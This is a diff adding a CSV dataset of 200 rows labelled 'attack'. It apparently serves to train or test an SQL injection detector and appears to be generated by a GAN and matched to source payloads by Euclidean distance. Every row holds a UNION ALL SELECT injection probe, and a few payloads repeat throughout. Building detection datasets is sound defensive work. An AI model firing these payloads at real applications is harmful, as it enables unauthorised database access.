@@ -1,0 +1,201 @@
+id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
+GAN_000001,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000097,3.6414892132921417
+GAN_000002,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,2.883407240089205
+GAN_000003,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.244425923092719
+GAN_000004,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.489251386935718
+GAN_000005,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.454982205285248
+GAN_000006,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.557469281243534
+GAN_000007,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.286301458049131
+GAN_000008,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000178,3.742217856103117
+GAN_000009,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.626276906389196
+GAN_000010,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,3.5938066614832618
+GAN_000011,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.3332516902052642
+GAN_000012,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.6075734375247017
+GAN_000013,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.0912002943931713
+GAN_000014,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.4066358108673978
+GAN_000015,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,3.436553632137332
+GAN_000016,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.1358377897878897
+GAN_000017,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.3398577508512584
+GAN_000018,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.48549831025926
+GAN_000019,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.5031203683106322
+GAN_000020,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,3.7134765569268526
+GAN_000021,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.83136506703624
+GAN_000022,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.5121999214541058
+GAN_000023,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.309713136705381
+GAN_000024,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000178,3.846156267218404
+GAN_000025,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.7381127810678167
+GAN_000026,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.2056400400968075
+GAN_000027,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.2302612438691445
+GAN_000028,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.5308174482440133
+GAN_000029,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.3108793336122804
+GAN_000030,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.1635195867624315
+GAN_000031,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.1513227258101515
+GAN_000032,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.0385352378427197
+GAN_000033,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.1673567616366913
+GAN_000034,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.5497111572730855
+GAN_000035,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.685797480128099
+GAN_000036,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.462780669968512
+GAN_000037,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,3.323289356875227
+GAN_000038,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.6661117307461826
+GAN_000039,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.044944959152594
+GAN_000040,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000241,3.3187339775124425
+GAN_000041,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.2415556009322253
+GAN_000042,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.0159123940778487
+GAN_000043,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.4783058573021264
+GAN_000044,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.5535832415066353
+GAN_000045,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.111372133139452
+GAN_000046,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000178,3.929839689277322
+GAN_000047,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.388277027271746
+GAN_000048,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.105523748353712
+GAN_000049,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.412899720697417
+GAN_000050,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.2613305117410825
+GAN_000051,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.6868806473051383
+GAN_000052,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.3015912016625357
+GAN_000053,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.6995220522891334
+GAN_000054,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.4556867503765534
+GAN_000055,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.104967913358894
+GAN_000056,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.8188201382968416
+GAN_000057,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.111979615669636
+GAN_000058,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.274505824049548
+GAN_000059,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.023661249954789
+GAN_000060,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,4.05583252211014
+GAN_000061,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.394807466614207
+GAN_000062,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.120560075978689
+GAN_000063,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.064466697733062
+GAN_000064,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.3611080736191825
+GAN_000065,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.4093859928453547
+GAN_000066,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.3015974766685496
+GAN_000067,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.1856452592565634
+GAN_000068,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.265775817540574
+GAN_000069,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,3.417259845907848
+GAN_000070,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.3580768021713476
+GAN_000071,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,3.4812550380872405
+GAN_000072,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.2784868090158983
+GAN_000073,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.122243292522949
+GAN_000074,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.2236788989165417
+GAN_000075,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.2247842497723256
+GAN_000076,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.597054012289656
+GAN_000077,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000241,3.31709202898724
+GAN_000078,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.54487927538514
+GAN_000079,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.277976506940533
+GAN_000080,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.1120672512970216
+GAN_000081,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.6108372275736103
+GAN_000082,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.3670247592805853
+GAN_000083,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.3232765366511576
+GAN_000084,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.4588651919534574
+GAN_000085,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.289333462726133
+GAN_000086,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.555239498242137
+GAN_000087,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.3270406761609053
+GAN_000088,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.4566835528768323
+GAN_000089,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.304354521197471
+GAN_000090,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.0158575764636923
+GAN_000091,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.167046517684742
+GAN_000092,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.4346804978427135
+GAN_000093,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000241,3.421968773241772
+GAN_000094,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.178323375830441
+GAN_000095,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.1262111336053353
+GAN_000096,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.396132908252161
+GAN_000097,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.0383971639848335
+GAN_000098,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.1271994719233143
+GAN_000099,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.4604815719830806
+GAN_000100,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.300069986637391
+GAN_000101,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.5615628840399958
+GAN_000102,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.5197807932018654
+GAN_000103,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.7501321964984484
+GAN_000104,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000051,3.3349372633895227
+GAN_000105,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.012863526882284
+GAN_000106,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.3524063139533515
+GAN_000107,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.3749126753742424
+GAN_000108,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.294063470718897
+GAN_000109,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,2.9329927874119592
+GAN_000110,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.4078385137972944
+GAN_000111,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.6350054617421077
+GAN_000112,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.3869660060573517
+GAN_000113,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000215,3.428582130377798
+GAN_000114,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.0372032641199014
+GAN_000115,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.601038630662218
+GAN_000116,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.2839940769662967
+GAN_000117,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.3890100775629883
+GAN_000118,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.187812021598654
+GAN_000119,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,3.668406876642137
+GAN_000120,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.3511268153880414
+GAN_000121,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.4846561216618976
+GAN_000122,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.4057064013835463
+GAN_000123,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,3.850375152041527
+GAN_000124,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.1797694213011867
+GAN_000125,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.2116619381035165
+GAN_000126,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000241,3.2640241267664294
+GAN_000127,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000051,3.452367404725359
+GAN_000128,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000241,3.394412477564351
+GAN_000129,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000097,3.634194035753742
+GAN_000130,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000241,3.3598842941718163
+GAN_000131,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.238667885621988
+GAN_000132,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000241,3.7200840580474064
+GAN_000133,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.305525329466683
+GAN_000134,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.2441142386507558
+GAN_000135,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.7332582222846553
+GAN_000136,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.274689500344158
+GAN_000137,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.5696331002164237
+GAN_000138,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000241,3.411049901077454
+GAN_000139,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,2.9885567451327786
+GAN_000140,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.087938854364138
+GAN_000141,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.1929560406988635
+GAN_000142,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.74654684165391
+GAN_000143,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,2.961206444094168
+GAN_000144,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.848450323337165
+GAN_000145,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.602190697842159
+GAN_000146,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.400051834482058
+GAN_000147,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.0536653756011427
+GAN_000148,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.3722628098932277
+GAN_000149,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.132599879014827
+GAN_000150,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.593254627287398
+GAN_000151,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000215,3.4872949545547365
+GAN_000152,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.672841574861022
+GAN_000153,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.166290446898063
+GAN_000154,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.609692368964083
+GAN_000155,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.6699502417075305
+GAN_000156,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.788784570038372
+GAN_000157,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.4755146588392116
+GAN_000158,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.2470099919467095
+GAN_000159,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000178,3.552651130723495
+GAN_000160,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.862557033661561
+GAN_000161,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.4487347723705875
+GAN_000162,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.057197099142578
+GAN_000163,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.3903822040771634
+GAN_000164,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.210431776271796
+GAN_000165,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.1934877676170155
+GAN_000166,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000178,3.6577291471707047
+GAN_000167,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.2456245624129423
+GAN_000168,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.423103549137973
+GAN_000169,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.6363404216549036
+GAN_000170,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.524637736637738
+GAN_000171,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.0882104108794426
+GAN_000172,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,2.999701057451713
+GAN_000173,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.4729428439554098
+GAN_000174,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.2890116585947466
+GAN_000175,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.564355264789323
+GAN_000176,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.6446122779336108
+GAN_000177,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.035451047884464
+GAN_000178,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.08835217217694
+GAN_000179,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.4686525645148225
+GAN_000180,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,3.673738814642626
+GAN_000181,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.5470552078834565
+GAN_000182,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.5349981159094765
+GAN_000183,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.20840045949225
+GAN_000184,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.4586732137705023
+GAN_000185,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,3.5017883621963573
+GAN_000186,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.655757401492781
+GAN_000187,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.353433815363452
+GAN_000188,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.6856012592520226
+GAN_000189,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.0563801331096676
+GAN_000190,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.2125020037513567
+GAN_000191,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,2.9288987955280343
+GAN_000192,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.4331842043001473
+GAN_000193,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.0699666113758757
+GAN_000194,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,2.9575302850960403
+GAN_000195,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.6595345994162582
+GAN_000196,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,3.368528682200722
+GAN_000197,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,3.5628984124765863
+GAN_000198,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.332670974808978
+GAN_000199,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.3152001512551146
+GAN_000200,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,3.0826748677481337
